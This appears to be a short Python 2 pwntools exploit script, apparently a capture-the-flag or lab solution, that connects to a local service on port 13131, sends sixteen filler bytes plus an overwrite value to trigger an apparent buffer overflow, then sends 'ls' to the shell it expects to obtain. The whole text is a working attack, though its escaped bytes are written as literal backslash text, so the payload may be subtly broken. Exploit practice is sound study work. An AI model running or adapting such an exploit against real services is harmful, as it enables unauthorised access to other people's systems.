from pwn import *

host = '127.0.0.1'
port = 13131
r = remote(host, port)

s = "a" * 16 + "\\xff\\x7f\\xec\\x1c\n"
r.send(s)
d = r.recv(2048)
print d

r.send('ls\n')
d = r.recv(2048)
print d

